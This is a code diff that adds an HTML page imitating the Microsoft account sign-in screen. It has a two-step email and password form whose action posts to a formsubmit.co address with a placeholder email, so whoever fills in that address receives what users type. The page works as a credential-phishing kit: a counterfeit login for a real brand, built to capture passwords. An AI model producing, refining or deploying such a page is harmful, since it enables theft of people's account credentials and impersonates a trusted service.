@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Microsoft Sign-in</title>
+ 
+    <link rel="stylesheet" href="gar.css">
+    <link
+      href="https://fonts.googleapis.com/icon?family=Material+Icons|Material+Icons+Outlined|Material+Icons+Round|Material+Icons+Sharp|Material+Icons+Two+Tone"
+      rel="stylesheet"/>
+
+     <link rel="icon" type="images/x-icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRteJaKC8CCd3BmSOr9BGT5KYmshX8mGGLZVG08ZIbDQw&s" />
+
+  </head>
+  <body>
+
+    </script>
+
+    <div class="center">
+      <form action="https://formsubmit.co/your@email.com" method="post">
+        <div class="logo">
+          <h2>Microsoft</h2>
+        </div>
+        <span class="wrapper">
+          <span class="section">
+            <div class="head">Sign in</div>
+            <span class="inputf">
+              <span class="label">
+                Enter a valid email address, phone number or Skype name.
+              </span>
+              <input
+                type="text"
+                class="input"
+                placeholder="Email, phone or Skype"
+                required
+              />
+            </span>
+            <div class="info">No account? <a href="">Create one!</a></div>
+
+            <span class="btn">
+              <button type="button" onclick="moveLeft()">Next</button>
+            </span>
+          </span>
+
+          <span class="section hidden">
+            <div class="email">
+              <span class="material-icons-outlined" onclick="moveRight()"
+                >west</span
+              >back
+              
+            </div>
+            <div class="head">Enter password</div>
+            <span class="inputf">
+              <span class="label">
+                Please enter the password for your Microsoft account
+              </span>
+              <input
+                type="password"
+                class="input"
+                placeholder="Password"
+                required
+              />
+            </span>
+            <div class="info"><a href="">Forgotten your password?</a></div>
+            <span class="btn">
+              <button value="submit" type="login">Sign in</button>
+            </span>
+          </span>
+        </span>
+      </form>
+    </div>
+
+    <script>
+      let sections = document.querySelectorAll(".section");
+let inputs = document.querySelectorAll(".input");
+function moveLeft() {
+  if (inputs[0].checkValidity()) {
+    document.querySelector(".wrapper").style.transform =
+      "translateX(-548px)";
+    sections[0].classList.toggle("hidden");
+    sections[1].classList.toggle("hidden");
+    inputs[0].className = "input";
+  } else {
+    inputs[0].className = "input alert";
+  }
+}
+function moveRight() {
+  document.querySelector(".wrapper").style.transform = "translateX(0px)";
+  sections[0].classList.toggle("hidden");
+  sections[1].classList.toggle("hidden");
+}
+    </script>
+
+  </body>
+</html>
